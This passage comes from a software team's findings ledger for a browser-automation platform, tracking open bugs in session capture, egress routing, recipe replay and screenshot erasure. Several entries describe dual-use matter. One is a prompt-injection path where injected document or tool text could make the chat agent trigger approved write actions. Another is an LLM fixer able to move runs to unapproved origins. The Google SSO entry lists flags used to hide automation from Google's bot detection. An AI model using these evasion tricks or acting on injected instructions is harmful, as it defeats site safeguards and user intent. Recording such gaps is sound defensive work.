# Findings ledger

The live findings ledger: OPEN first, then recently fixed, then accepted/by-design. A finding closes
only by a landed fix + committed test, or a written dismissal. Replaces the release FINDINGS table and
the RUN_LOG finding tail. Journey findings keep their `F` ids; later findings use readable slugs.

## OPEN

- **`a-ceremony-session-is-unusable-on-the-machine-that-established-it`** (**EGRESS HALF FIXED
  2026-08-31 in 975fba2a; the LEGIBILITY half is OPEN, MEDIUM**, cofre session checkout / bridge
  egress; found running the cornerstone acceptance runbook live on a Mac). The attended ceremony
  captures a session, stamps it
  `establishedBy:{kind:'machine',pairingId:M}` + `boundEgress:{kind:'residential',pairingId:M}`
  (`bridge/attended.ts`, the only writer of `establishedBy: machine`), and `checkoutSession`
  (`cofre/session-checkout.ts:108`) then releases it ONLY when M appears in `residentialAvailable`.
  That list is `residentialEgressPairings` (`automation/egress-policy.ts:87`), which requires the
  daemon to advertise `egress.residential` AND carry an `egressEndpoint` - a real proxy address
  (Tailscale in production, `docs/decisions.md` 2026-07-28 E-3). A bridge that has no proxy endpoint
  configured - which is every local/dev bridge, and the one the committed acceptance runbook tells
  the operator to start - therefore advertises no residential egress, so its OWN freshly captured
  session is refused `egress-unavailable` on the very machine that established it and on which the
  automation is already running via `desktop.automation`. VERIFIED LIVE end to end: ceremony
  completed, item `itm_...` minted `boundOrigins:['127.0.0.1']`, `healthy:true`, unlocked; the
  parked run resumed, re-navigated, and the page was still the login wall; a fresh run-now halted
  `needs_credentials` again. THE LOOP IS THE HARM: `adhocSessionReuse`
  (`automation/credential-gate.ts`) maps every non-`reused` verdict - including `needs-egress` - to
  `not-applicable`, so no session is injected and the run halts with "answered with a sign-in wall",
  which sends the user back to the ceremony that just succeeded. Indefinitely, with no surface
  anywhere saying the session was found and withheld for want of an egress route. CLOSE BY (needs a
  product decision): either treat a step already routed to machine M as satisfying M's own
  residential binding (the traffic does leave from M, so the binding is met by construction), or
  keep the requirement and make the refusal legible - surface `needs-egress` distinctly at the
  action surface instead of collapsing it into the sign-in-wall halt, so the user is told the
  session exists and what is missing. The silent collapse is the part that must not survive either
  way.

  **THE FIRST ROUTE IS THE ONE THAT LANDED** (975fba2a): the requirement is KEPT and the endpoint is
  made real. `clients/bridge/src/egress/proxy.ts` is a forward proxy (CONNECT tunnels + absolute-form
  http) the daemon serves on a FIXED `127.0.0.1:8792` when `egressProxy` is configured and no
  external endpoint is, so a local bridge advertises `egress.residential` with a genuine
  `egressEndpoint` and `checkoutSession` releases the session it just captured. The port is fixed
  rather than ephemeral on purpose: a grant NAMES the endpoint it authorises and Cortex compares the
  two by EQUALITY, so a port that moved on restart silently voided the grant.

  **WHAT IS STILL OPEN is the second half, and it is the one the entry says must not survive either
  way.** `adhocSessionReuse` still maps every non-`reused` verdict - `needs-egress` included - to
  `not-applicable`, so a session that exists and was withheld is still reported to the user as "the
  page answered with a sign-in wall". The loop is no longer reachable on a proxy-serving bridge, but
  the collapse that made it unexplainable is untouched, and any other reason checkout refuses will
  land in exactly the same silence. CLOSE BY surfacing `needs-egress` distinctly at the action
  surface.

- **`the-needs_credentials-halt-has-no-door-on-the-integration-detail-page`** (2026-08-31,
  **MEDIUM**, K2/K5 surface; found running the runbook live). The API answers a complete
  `credentialRequest` - `portalDeepLink`, `reason`, and the `ceremony` relay prompt - but
  `/integrations/[key]` renders only flat text plus the run id ("A sequência de passos está à espera
  de uma credencial para continuar (run <uuid>)"). There is no link, no button, nothing that reaches
  `/cofre`. The K2 halt is honest and then dead-ends: the user is told a credential is needed and
  given no way to supply one, and the run id is the only thing on offer. Reaching the ceremony
  required pasting the deep link by hand. CLOSE BY rendering `credentialRequest.portalDeepLink` as
  the primary action of that banner, with `reason` as its text - both are already on the wire.

- **`integrations-grid-logs-two-console-404s-for-a-citius-sync-state`** (2026-08-31, **LOW**,
  dashboard; found running the runbook live). Loading `/integrations` emits two console errors,
  `GET /api/v1/sync/citius/notificacoes/state 404`, on a workspace with no Citius integration
  configured. Violates the standing zero-console-error bar for dashboard specs (CLAUDE.md QA
  process). Unrelated to the cornerstone; surfaced by driving the surface it ships on.

- **`the-rehearsal-fixer-may-relocate-a-run-to-any-origin`** (2026-08-28, **MEDIUM**, engine
  self-correction; found tracing a live wrong-origin run). `proposePatch` may author a replacement
  `navigate` step with ANY url (`rehearsal.ts` accepts any non-empty string; `VALID_STEP_TYPES_FOR_
  PATCH` admits `navigate`), and its own prompt teaches origin-changing recovery ("navigate_failed
  usually wants replace_current with a different URL", plus worked examples that navigate to a
  search engine). So a model can move a run from the origin its owner approved onto another one -
  while the run may hold a Cofre session established for the FIRST origin. Related and already
  ledgered: `posture-drift-check-cannot-stop-the-act-that-navigates`. Now partly bounded: the
  engine fails a navigate whose landed ORIGIN differs from the requested one (this commit), so a
  relocation at least cannot be silent, and the session is injected per resolved origin by the
  credential gate. NOT closed, because the fixer may still legitimately author a navigate to a
  different origin and have it succeed. CLOSE BY (needs a product decision, not a unilateral
  change): either constrain fixer-authored navigate origins to the automation's own declared/
  visited origins and refuse the rest - which would contradict the documented search-engine
  recovery pattern and should therefore be a deliberate decision - or keep the freedom and require
  a re-established session per origin with an explicit run event when the run relocates.
  **OBSERVED LIVE 2026-09-01** (dev-madrid, the first bridge-connected run of the shipped citius
  action): a `{{config.portal_url}}` navigate emptied by the seam drop failed, and the fixer's
  replacement drove the REAL `citius.tribunaisnet.mj.pt` - a national court portal - exactly as
  this entry predicted. The invented-destination ENTRY to the relocation is now closed (an empty
  navigate halts non-recoverably naming the template; see Recently fixed 2026-09-01); a fixer
  responding to an ordinary failed navigate with a cross-origin patch remains possible, so the
  product decision above still stands.

- **`recipe-replay-executes-before-the-automation-owner-check`** (2026-08-28, **MEDIUM**, recipe
  spine multi-user; cornerstone Codex checkpoint). A successful recipe replay returns from
  `runAutomationForAction` (service.ts ~1618) BEFORE the automation-owner gate (~1725) that the
  authored-run leg enforces, so a same-org peer who can reach an org-SHARED action executes its
  learned recipe under their own session even though they are forbidden to run the bound automation.
  For a read that is the intended widening (the peer runs under their own credentials and sees their
  own data). It becomes a hazard only when combined with
  `mint-read-verdict-misclassification-...` below: a state-changing GET wrongly learned as an
  idempotent read replays freely for the peer, so the peer triggers a mutation through a wrapper
  they may not run. Bounded: minted definitions are PRIVATE by default (a peer sees nothing until
  the owner deliberately org-shares), and a genuinely non-idempotent call still meets the replay
  write-gate. CLOSE BY: gate the replay leg on the same owner/visibility check the authored leg
  applies (a shared read may still replay per-user; a shared action whose recipe contains any
  non-GET stays owner-only), OR drop the idempotent flag for a call whose posture is adversarial.
  Layered today by: private-by-default, the injection-hardened classifier (below), and the
  non-idempotent replay write-gate.

- **`k3-resume-rerun-resolves-the-current-definition-not-the-halted-shape`** (2026-08-28, **LOW**,
  K3 resume; cornerstone Codex checkpoint). The parked `actionRetry` row stores only
  `{integrationKey, actionName, args}`, so the post-ceremony learn re-run resolves whatever action
  now carries that key+name - if an authorised editor swapped the action while the run was parked,
  the re-run executes the replacement under the victim's identity. Bounded hard: the re-run goes
  through `executeUserIntegrationAction`, so a mutating replacement answers `awaiting_consent` and
  does not run, and the re-run only fires for a storable (read) action at all; the blast radius is
  a different READ under the owner's own credentials. CLOSE BY: pin the action-shape fingerprint on
  `actionRetry` and refuse the re-run when the current shape differs.

- **`chat-invoke-tools-are-a-confused-deputy-surface`** (2026-08-28, **MEDIUM**, K5 chat doors;
  cornerstone Codex checkpoint). The chat agent co-mounts read surfaces (knowledge_search/read,
  the list_* catalog tools, action results) with the three invoke tools in one loop, and none of
  the seams carries a provenance/user-intent token. So injected text in a knowledge document, a
  stored action description, or a tool result can instruct the model to `call_integration_action`
  an already-`always`-approved write in the same turn - and because `action-consent` excludes the
  description from its shape fingerprint, the standing approval stays valid. Bounded: the injection
  can only trigger the TIMING of an action the user already blessed for that exact (shape, target);
  it grants no new effect, cannot cross tenants (actor is bound, never an argument), and
  `call_ekoa_action` now refuses any recipe that writes (recipeMutates). Mitigated structurally by
  `safeField` collapsing author-controlled description text to one line (removes the fake-row /
  fake-heading vector). CLOSE BY (larger work, out of this cornerstone): a provenance token on
  tool-output-derived text plus a quarantine that forbids an invoke whose justification traces to
  untrusted content, or a per-turn re-confirmation for a write triggered without a direct user ask.
  This is the standing trust-model limit of giving a chat agent invoke tools; recorded as such.

- **`mint-read-verdict-misclassification-enables-unattended-re-execution`** (2026-08-28, **MEDIUM**,
  mint classifier; cornerstone adversarial review). D-CORNERSTONE-MUTATES-CLASS accepts that the
  mint's read verdict on a BROWSER-step flow rests on the model confirmation alone (the
  deterministic floor has no signal for what a browser step does), fail-closed on any doubt. The
  review named the sharpest consequence: a write-shaped browser flow the model wrongly confirms as
  a read is minted `mutates:false`, so (a) it learns a recipe (whose non-idempotent calls the
  replay write-gate still refuses - layered), and (b) a `needs_credentials` first contact stamps
  `actionRetry` and the K3 post-ceremony driver RE-EXECUTES the flow once in the background - a
  duplicated side effect (e.g. a form submitted twice) with no human in the loop. Bounded: the
  same user goal-authored the flow and watched its rehearsal; the re-run repeats what they just
  ran. ACCEPTED for now as the recorded D-K4 trade-off; CLOSE BY tightening the floor with
  browser-step signals (form-submit detection in rehearsal records) or gating the K3 re-run on a
  second cheap read-confirmation.

- **`record-replay-racing-a-supersede-resets-the-new-recipes-drift-streak`** (2026-08-28, **LOW**,
  recipe stats; cornerstone adversarial review). Concurrent executions of one action: run A replays
  v3 ok while run B drifts and supersedes to v4 (driftStreak+1); A's best-effort `recordReplay`
  then lands on v4 (the CAS re-runs its decide against the current row) and writes replayCount+1 +
  driftStreak:0 onto a version that never replayed - so under concurrent schedule ticks a genuinely
  unhealable action can thrash past HEAL_BUDGET indefinitely. Requires sustained concurrency of the
  same action with alternating replay-ok and drift outcomes. CLOSE BY carrying the replayed VERSION
  into `recordReplay` and refusing the stats write when the row's version moved.

- **`action-cache-persists-resolved-fill-values-verbatim`** (2026-08-28, **MEDIUM**, security triage;
  cornerstone audit incidental). The per-step action cache stores the resolved PlaywrightAction
  verbatim, including `fill` values (`api/src/automation/cache.ts:259-289` - only the term-scored
  content summary is de-valued), as durable rows in the memories collection. Verifier-extracted
  inputs refuse secret-shaped key names and the planner forbids sign-in steps, so the login path
  should never cache a credential fill - but a vision-resolved fill on any page carrying sensitive
  user data (document numbers, personal fields) persists that value in Mongo under cache visibility
  'private'. Bounded per-owner (caches never cross users) yet unreviewed against the credentials-as-
  references rule. TRIAGE: decide whether fill values need the SecretRegistry redaction pass or a
  value-allowlist before the cornerstone widens cache traffic (mint-on-plan makes every free-text run
  an action run).

- **`direct-second-registrable-domain-target-needs-a-fresh-ceremony`** (2026-08-26, **MEDIUM**,
  multi-domain; found by the adversarial lifecycle+binding audit). A session captured on a portal's
  primary domain (`ubereats.com`, item bound `[ubereats.com]`, jar carrying valid `.uber.com` SSO
  cookies) does NOT authenticate an unattended replay whose FIRST step targets the SECOND registrable
  domain DIRECTLY (`uber.com`), not reached by redirect: discovery is binding-keyed, so
  `findSessionItemsForOrigin('uber.com')` misses the `ubereats.com`-bound item even though its stored
  jar holds working `uber.com` cookies, and a re-ceremony for `uber.com` opens a FRESH per-host profile
  (`ceremony.ts` `hostKeyOf` keys profiles per exact host) - a full second attended login, not the
  "captures at once" the sessions.ts docblock previously (falsely) claimed. The COMMON flow (enter on
  the primary domain, redirect to the SSO/second domain) is unaffected - the whole jar is injected and
  rides the redirect authenticated. CLOSE BY (deferred, needs care): either key ceremony profiles per
  registrable-domain / per-owner, OR add reuse-side discovery that consults the stored jar's own cookie
  domains (SAFE at reuse time - the jar was already minted through the binding-checked capture path,
  unlike the push-time jar D-BIND-NARROW distrusts). Needs a public-suffix helper to get registrable
  domains right (Portuguese gov TLDs etc.), which is why it is deferred rather than guessed.

- **`spa-fetch-login-closed-inside-the-tick-can-mint-a-signed-out-item`** (2026-08-26, **LOW**,
  ceremony capture; audit). An SPA portal that logs in via `fetch`/XHR (no `framenavigated` after the
  credential POST) whose human CLOSES the window within the 2s snapshot interval pushes a `lastSnapshot`
  that predates the `Set-Cookie`; `hasCookies` passes on pre-login consent/analytics cookies and
  `boundOriginsForEstablishedHost` finds those covering the ceremony host, so a healthy-looking item
  with an armed grant is minted whose replay is signed out (fails two hops downstream). Bounded: the
  PRIMARY completion path is the "Concluir e capturar" Done button, which snapshots FRESH state at the
  moment of the press (not the last tick), so this only bites the CLOSE fallback + SPA-fetch-login +
  close-inside-tick combination. CLOSE BY: on the close path, treat a snapshot with no cookie NEWER than
  the ceremony start (or unchanged from the open-time snapshot) as "não concluída" rather than pushing;
  or snapshot on CDP `Network.responseReceived` Set-Cookie events in addition to `framenavigated`.

- **`attended-ceremony-headed-browser-is-not-viable-for-a-normal-user`** (2026-08-25, **MOSTLY FIXED
  2026-08-26; residual downgraded to MEDIUM**, design; operator-flagged emphatically after the live
  ceremony: "the experience is still very bad ... a normal user would not be able to cope with this").
  The BIG causes are fixed by the ceremony rebuild (`Recently fixed - 2026-08-26`, D-CEREMONY-REALCHROME):
  the window is now a NORMAL persistent real-Chrome window, not throwaway bundled automation Chromium -
  no "controlled by automated software" banner, navigated ONCE so no tab-flap/re-goto, the login
  persists (login-once-per-site), and capture happens in the SAME real-Chrome environment replay runs
  in. **NOT an extension, by operator decision** - every other agent reached for one because the
  frictionless "attach to the user's EVERYDAY browser" path is the security boundary Chrome closed in
  Chrome 136 (May 2025): `--remote-debugging-port`/`--remote-debugging-pipe` are ignored on the default
  `--user-data-dir`, so CDP-attaching to the real profile (the cookie-theft vector) no longer works
  (developer.chrome.com/blog/remote-debugging-port); a dedicated profile is the floor, one login per
  site. RESIDUAL #2 (the window opens on the BRIDGE machine, which may not be where the human sits) is
  now CLOSED by the ceremony live stream (`Recently fixed - 2026-08-26`, D-CEREMONY-STREAM): the window
  is streamed into the dashboard and driven from whatever device the human is on. ONE residual remains,
  LOW: even in the streamed view the OS still raises the window on the bridge on each login redirect
  (inherent to a headed browser on macOS, see
  `attended-ceremony-browser-steals-focus-and-hides-its-capture-signal`) - harmless when nobody is at
  the bridge, and the human drives from their own device regardless. Does not block the acceptance
  matrix.

- **`bridge-pair-drops-extracapabilities-across-a-repair`** (2026-08-25, OPEN, **MINOR**, product;
  found re-pairing during the live acceptance retry). `ekoa-bridge pair` deliberately carries the
  `org` and per-pairing `signingSecret` forward across a re-pair (`clients/bridge/src/cli/commands/pair.ts`
  docblock: "Existing org/signingSecret, if a prior config held them, are carried forward"), but it
  DROPS `extraCapabilities` - so a machine the operator had opted in to `desktop.automation` silently
  reverts to advertising only the defaults after any re-pair, and every `serve` afterward is missing
  the capability until the operator re-edits config.json by hand. Measured live: three re-pairs this
  session, each requiring the `extraCapabilities` one-liner re-run before the bridge would advertise
  `desktop.automation`. CLOSE BY: carry `extraCapabilities` forward across a re-pair exactly as `org`
  and `signingSecret` are (it is a deliberate operator opt-in, not pairing-scoped state), OR surface a
  first-class `pair`/`serve` flag for it so it is not a hand-edit at all. Compounds the dev-stack churn
  because an ephemeral-Mongo restart also drops the server-side grant, so the operator re-does BOTH the
  bridge opt-in and the org grant on every restart.

- **`establish-endpoint-reports-started-true-for-a-bridge-that-cannot-run-the-login-ceremony`**
  (2026-08-25, OPEN, **MEDIUM**; found running the acceptance-run durable ceremony live). `POST
  /api/v1/cofre/sessions/establish` (`api/src/routes/cofre.ts`) gates on the machine advertising
  `attended.card_login` and then reports `{started:true, message:"Abriu-se uma janela na sua
  maquina"}`. But the ad-hoc `login` ceremony kind is NEW (landed 2026-08-25 in the session-capture
  slice); a bridge built before it advertises `attended.card_login` yet its `runAttendedCeremony`
  has no `login`-kind branch, so it silently drops the `attended.request` and opens NO window - while
  the user is told one opened. Measured live: a Mini running the 2026-08-24 08:20 bridge tgz, server
  sends the ceremony (`started:true`), no window appears. The handler's own comment
  ("`attended.card_login` is the capability for BOTH kinds: the daemon runs one ceremony and does not
  branch on the kind") is the false assumption - a daemon that predates the kind DOES need the code,
  and does not have it. CLOSE BY: either advertise a distinct capability/version signal for the
  login-ceremony kind (so the establish check fails closed for an old daemon with a "update the
  bridge" message, exactly like the too-old branch already there for the card path), OR have the
  daemon ACK/NACK a ceremony request by kind so Cortex reports `started:false` truthfully when the
  bridge cannot run it. A "a window is opening on your machine" that is a lie is the worst shape of
  this - fail closed with the update prompt instead. (Operationally: the bridge is versioned client
  software, so any feature touching the ceremony rail requires the user to update their installed
  bridge; the acceptance run needs the freshly packed tgz.)

- **`dashboard-login-redirect-drops-the-intended-deep-link`** (2026-08-25, OPEN, **MEDIUM**, UX;
  operator-flagged as broadly important). Navigating to a dashboard deep link while unauthenticated
  (e.g. `/cofre?origin=www.ubereats.com`, or any `/settings/*`, `/integrations/[key]`, a run link)
  bounces to `/login` and, after a successful login, lands on the default route (`/chat`) rather than
  RETURNING to the deep link the user asked for - so the query string and the destination are lost
  and the user has to paste the URL again. Every deep-linked flow the platform sends a human to (the
  ceremony `/cofre?origin=` link the needs_credentials halt writes, a shared run link, a settings
  link) is degraded by this. CLOSE BY: the login flow must capture the intended destination
  (the pre-redirect path+query, via a `returnTo`/`next` param or stored location) and navigate there
  after auth instead of to the default route - the standard post-login return-to pattern. This is a
  general dashboard auth-flow fix, not specific to the ceremony, and worth its own small slice.

- **`google-sso-refuses-the-automated-ceremony-browser`** (2026-08-24, OPEN, **MEDIUM**, external
  constraint; found in acceptance run 1). When the attended-ceremony window (Playwright/CDP-driven
  headed Chrome on the bridge, `channel:'chrome'`, `--disable-blink-features=AutomationControlled`,
  `navigator.webdriver` deleted) reaches a "Continue with Google" OAuth leg, Google's server-side
  automation detection refuses with "Couldn't sign you in - This browser or app may not be secure"
  (`accounts.google.com/v3/signin/rejected`). The profile hardening defeats client-side
  `navigator.webdriver` checks but not Google's detection, which is a known industry-wide block on
  automated browsers. CONSEQUENCE: an adversarial target reachable ONLY via Google SSO cannot have
  its session established through the attended ceremony - the human is present and willing but Google
  refuses the automated browser itself. Direct login forms (email/phone + password/OTP) on the same
  target are unaffected and complete the ceremony normally. NOT a defect in this codebase; recorded
  because it bounds what the attended ceremony can capture and because the acceptance-matrix targets
  should be chosen or logged in with a non-Google method. CLOSE/MITIGATE: for a target that offers
  both, drive the direct-credential login; for a Google-only target, the only paths are a
  pre-established session imported into the profile or a real (non-automated) browser doing the
  capture - both outside the current executor.
  THE IN-PRODUCT MITIGATION IS SHIPPED (2026-08-24); the finding STAYS OPEN because the constraint
  is Google's and nothing here can lift it. What changed is that a user is now told BEFORE they walk
  into it, at the two places they read a login pause: the ceremony banner
  (`web/components/automations/run-viewer.tsx`, `credentialsGoogleHint` in en/pt, ceremony mode only
  - in typist mode the platform replays a stored password and there is no sign-in choice to make),
  and the `paused_for_user` Post-it, where the engine APPENDS the sentence to a `humanAction`
  of kind `login` (`api/src/automation/login-guidance.ts`, wired at the pause in
  `api/src/automation/engine.ts`; the English regex fast path in `rehearsal.ts` carries the same
  sentence in its own copy). Appended rather than asked of the vision prompt on purpose: a prompt
  line makes the guidance likely and untestable, the append makes it certain and pinnable. Pinned by
  `api/tests/automation/login-guidance.test.ts`, one case in `api/tests/automation/engine.test.ts`
  ("a LOGIN pause carries the Google-SSO warning..."), and
  `web/__tests__/components/needs-credentials-google-hint.test.tsx`. RESIDUAL, unchanged: a target
  reachable ONLY through Google SSO still cannot have a session established by this executor.

  UPDATE 2026-08-26 (needs live re-verification). Two things changed the ground under this finding, but
  neither is verified against Google yet, so it stays OPEN. (1) The ceremony window is now a NORMAL
  persistent real-Chrome window with the `--enable-automation` infobar suppressed (D-CEREMONY-REALCHROME)
  - a stronger disguise than the `channel:'chrome'` + webdriver-delete the original report tested, so
  Google's block MAY no longer fire; the card copy was softened from an absolute "Google blocks
  automated browsers" to "if it does not advance, use email/phone" to match that uncertainty. (2) The
  card now OFFERS an opt-in Chrome-sync path (D-CEREMONY-CHROME-SIGNIN): sign into Chrome inside the
  ceremony profile to reuse saved passwords. Whether Google permits that sign-in in this window is the
  SAME automation-detection question and is equally unverified. NEXT: a live pass driving a Google-SSO
  target through the real-Chrome ceremony (ideally streamed) to see whether the rejection still occurs;
  if it does not, this finding downgrades or closes.

- **`delete-pairing-route-has-no-descriptor`** (2026-08-24, OPEN, **MINOR**, contract gap; flagged by
  the capability-grant slice, out of its scope). `DELETE /api/v1/bridge/pairings/:pairingId`
  (`api/src/routes/bridge.ts`, the R-9 kill switch) is a mounted route with NO entry in
  `ekoaLocalEndpoints` (`shared/src/ekoa-local.ts`), so it is invisible to both coverage gates and to
  the generated typed client. The capability-grant slice extended this same router and added
  descriptors for its three new routes but left this pre-existing one undescribed, because adding a
  descriptor moves `EXPECTED_PENDING_COUNT` (schema-coverage) and that re-pin belongs with the route
  it describes, not a sibling slice. CLOSE BY: a descriptor entry (`auth: 'user'` - it is owner-or-
  admin, unlike the grant routes) plus the coverage-pin bump and OpenAPI/client regen state check in
  the same change. Its own small slice.

- **`bridge-device-verification-url-uses-the-api-origin-not-the-dashboard`** (2026-08-24, OPEN,
  **MINOR**, UX/product). `ekoa-bridge pair` printed
  `Para autorizar este dispositivo, abra ... https://<host>:4111/settings/devices` - the API origin
  (`:4111`), which serves no such page (`Cannot GET /settings/devices`); the real page is on the
  dashboard (`:3000`). The device-login `verification_uri` the API returns names its own origin
  rather than the configured web origin, so a human following the printed instruction lands on a
  blank error. Observed live during acceptance run 1 pairing. CLOSE BY: derive the device-flow
  `verification_uri` from the dashboard origin (the same `EKOA_PUBLIC_WEB_HOST` / configured web
  base the CSP and frame-ancestors plumbing already resolves), not from the API request's own host.

- **`publish-floor-redacts-the-authoring-shape-and-silently-demotes-a-published-action`**
  (2026-08-23, OPEN, **MINOR**, fails closed; found during the S10 evidence run, leg D - not caused
  by it). The S6 deterministic floor redacts `authoring.shape` out of every published snapshot,
  because a 32-char md5 content fingerprint is indistinguishable from a leaked token to
  `LONG_HEX_RE` (`api/src/integrations/publish-scrub.ts`, `looksLikeLiteralSecret`). Observed on the
  wire, `POST /api/v1/integrations/definitions/:id/publish-preview`:

  ```json
  { "path": "config.actions[1].authoring.shape", "rule": "literal-secret-token",
    "source": "floor", "removedChars": 32 }
  ```

  It is not a secret; it is the fingerprint of the action's own binding, and TWO places compare
  against it: `authored-action.ts:457` decides an action's effective state with
  `record.shape === actionShape(integrationKey, action)`, and `:552` refuses verification the same
  way. With the stored value replaced by `[REDACTED]` the comparison can never hold, so **a TRUSTED
  authored action arrives in a receiving org reading `provisional`** and has to be re-approved there.
  It fails CLOSED - nothing is over-trusted by this - which is why it is MINOR rather than serious.
  What makes it worth a ledger entry is that the demotion is silent at both ends: the publisher is
  told only that 32 characters were removed from a field called `shape`, and the receiving org sees
  an action that simply looks ungraduated.
  CLOSE BY: exempting the authoring fingerprint from the free-text literal scan by POSITION rather
  than by shape - the same distinction this module's own header draws for credential-named keys
  ("the publish floor judges POSITION instead of shape") - and pinning it with a publish test that
  asserts a trusted action survives a round trip still trusted. Do NOT widen `LONG_HEX_RE`: the
  entropy rule is the floor's whole value on free text.

- **`the-self-extension-loop-has-no-ui-for-its-promotion-step`** (2026-08-23, OPEN, **MINOR**;
  found during the S10 evidence run, leg B). `trustAction`
  (`POST /api/v1/integrations/:key/actions/:actionName/trust`, auth `user`) has **no caller anywhere
  in `web/`** - a grep across `web/app`, `web/components`, `web/stores` and `web/lib` returns
  nothing. The detail page renders both ends of the state it governs (`t.provisional` -> "Escrita
  pelo assistente", `t.trusted` -> "Confirmada", `action-detail.tsx:273-274`) and offers no control
  to move between them. So a user whose `achieve` call minted a provisional action can see that it
  is provisional, can approve its WRITE through the consent dialog, can run it - and then cannot
  graduate it without calling the API by hand. The evidence run completed the loop over curl.
  This is the same dead-binding-adjacent shape the ledger already names three times, with the
  direction reversed: the route, its guardrails (shape confirmation, validated-run prerequisite) and
  its tests are all real and reachable; only the affordance is missing.
  CLOSE BY: a "Confirmar esta ação" control on the provisional badge that posts the shape the card
  is displaying - the confirm-what-you-saw discipline the route already enforces - plus an e2e leg
  that mints, trusts and re-runs through the UI alone.

- **`citius-sync-state-probe-404s-twice-on-every-integrations-visit`** (2026-08-23, OPEN, **MINOR**,
  cosmetic + a duplicate request; found during the S10 evidence run, leg C). Every load of
  `/integrations` fires `GET /api/v1/sync/citius/notificacoes/state` **twice**, and both answer 404
  (`{"error":{"code":"NOT_FOUND","message":"Sincronização Citius não está disponível."}}`) on a
  deployment that does not mount the sync rail. The 404 itself is by design and is documented as
  such in `web/lib/sync/citius-sync.ts` and in three e2e specs, which distinguish "not for this
  deployment" from a failure and render nothing. What is not by design is that it lands as **two
  console errors on a dashboard route**, against a QA bar (`docs/testing.md`) that asks band-1 specs
  to assert zero console errors where they touch the dashboard - so the bar is now unmeetable on the
  main integrations page without an allowlist. The duplication (two identical requests, ~2 ms apart)
  also suggests the probe is fired from two mount points, or twice under React strict-mode effects.
  CLOSE BY: probing once, and treating the "not for this deployment" answer as a non-error at the
  fetch layer (or letting the server answer a 200 with an explicit `available: false`) so a designed
  absence stops being logged as a failure.

- **`screenshot-erasure-path-has-no-production-caller`** (2026-08-20, OPEN, **MEDIUM, raised to
  MEDIUM by slice S1** - dead binding + a GDPR gap that evidence pins make load-bearing; found
  while wiring S1's retention exemption, NOT caused by it). `deleteRunScreenshots`
  (`api/src/automation/screenshot-plane.ts`) has **no production caller**. A grep over `api/`
  returns exactly three hits: its own definition, its re-export from `automation/index.ts`, and
  `api/tests/security/screenshot-plane.test.ts`, which calls it directly. Nothing in `api/src`
  invokes it - not a run delete, not a user delete, not an org delete, not any request path.

  **Its docblock claims otherwise**: *"Erase every screenshot for one run (the delete-on-run-delete
  / erasure-request path)"*. There is no delete-on-run-delete path and there is no erasure-request
  path; the only thing that ever removes these PNGs is the AGE-BASED sweep
  (`sweepExpiredScreenshots`, armed at boot from `server.ts` and, since round nine, re-run every
  `RETENTION_SWEEP_INTERVAL_MS` on its retention rail). So the tree of authenticated
  client-portal screenshots - court filings, processo numbers, client NIFs, as pixels - has
  retention but no erasure, while a function named for erasure sits beside it looking like coverage.
  Its suite is green because it tests the function, never a caller.

  **THIS IS THE FOURTH INSTANCE OF THE DEAD-BINDING CLASS** in this repo (after
  `the-attended-session-ceremony-was-built-tested-and-unreachable`, `m365proxy-manifest-flag-stripped`
  and `P4.2-was-dead-code-in-production`), and the third to be found by someone building on top of
  the thing rather than by a suite. The pattern is identical every time: a correct, tested function
  whose composition-root binding does not exist, kept plausible by a docblock describing the caller
  it never got.

  **WHY S1 RAISES THE SEVERITY.** S1 gives `sweepExpiredScreenshots` a `pinnedRunIds` exemption so a
  run named by an integration action's live evidence is spared however old it is (evidence stores
  `{runId, stepIndex}` POINTERS, so sweeping the run breaks the detail page and destroys the proof a
  promotion to `trusted` rests on). That exemption is correct and is tested - and it means a pinned
  run is now retained PAST the 7-day window with nothing anywhere that can remove it on request.
  Before S1 the gap was "erasure relies on ageing out"; after S1 it is "for pinned runs, ageing out
  no longer happens either". **S1 deliberately claims no erasure coverage**: not in the sweeper's
  docblock, not in a decisions entry, not in its report. The pin is an age-sweep exemption and is
  documented as exactly that.

  CONSEQUENCE IF NOT CLOSED: this product cannot answer a GDPR erasure request over automation
  screenshots at all, and for evidence-pinned runs it cannot even wait one out.
  CLOSE BY: giving `deleteRunScreenshots` its real callers (run delete, user delete, org delete),
  then pinning each binding with a test that reddens when the binding is deleted, which is the only
  check that would have caught this one. Not done in S1: an erasure path that spans run/user/org
  deletion is its own slice with its own blast radius, and half-wiring it would produce a fifth
  instance of exactly this class.

  **2026-08-20 (S1 round two), HALF OF THE CLOSE-BY IS DONE, AND THE OTHER HALF IS UNCHANGED.** The
  "make evidence removal release the pin" half was not a nicety - S1 as it first landed had NO
  removal path at all for `integration_action_evidence`, so a pinned run was exempt from the age
  sweep FOREVER (see `action-evidence-had-no-removal-path` below). That is now closed: the pin is
  released when the action is dropped. The erasure half stands exactly as written above: there is
  still no request-driven erasure over this tree, and S1 still claims none.

  **2026-08-20 (S1 round three), CORRECTING THE PARAGRAPH ABOVE, AND THE ERASURE HALF MOVES A LITTLE.**
  "The pin is released when the action is dropped" was true only for the org that WROTE the
  definition. For a `global` definition's consumers - and for every member of an org whose definition
  was retired by `setVisibility` - nothing released it, so for those runs the permanent exemption
  survived round two intact (`evidence-collector-scoped-to-the-writing-org`). It is closed now by a
  reconciliation keyed on the row's own owner. Separately, the OWNER now has one request-driven
  control that reaches the pin: disconnecting the credential (`DELETE /api/v1/integrations/:key`)
  discards the evidence rows that credential produced, and therefore their pins. That is a control
  over `integration_action_evidence`, NOT over the screenshot tree - `deleteRunScreenshots` still has
  no production caller and this entry still claims no erasure coverage over the PNGs.

  **2026-08-20 (S1 round four), CORRECTING THE PARAGRAPH ABOVE AGAIN, AND THE ERASURE HALF MOVES
  AGAIN.** "It is closed now by a reconciliation keyed on the row's own owner" was a fix that
  DELETED ACROSS A TENANT BOUNDARY (`write-time-reconciler-deleted-across-a-tenant-boundary` below),
  so it is gone. Pin release is now: the READER'S own run when it can no longer resolve the action,
  the writing org's own reconciliation, the owner's new erasure control
  (`DELETE /api/v1/integrations/:key/actions/:actionName/evidence`), the credential disconnection,
  and - the one that needs nobody to notice anything - the retention sweep at 90 days
  (`sweepExpiredEvidence`). That last one is what finally makes the pin's retention BOUNDED in every
  case rather than in the cases somebody enumerated. (Written "boot retention sweep" here until round
  nine, and at boot was all there was - see
  `the-90-day-bound-was-contingent-on-somebody-deploying`.) It is still not erasure over the PNGs:
  `deleteRunScreenshots` still has no production caller and this entry still claims no erasure
  coverage over the screenshot tree.

  **2026-08-20 (S1 round six), CORRECTING THE PARAGRAPH ABOVE ONE LAST TIME - TWO OF THE FIVE
  RELEASES LISTED THERE NO LONGER EXIST.** Round five deleted every synchronous collector, so *"the
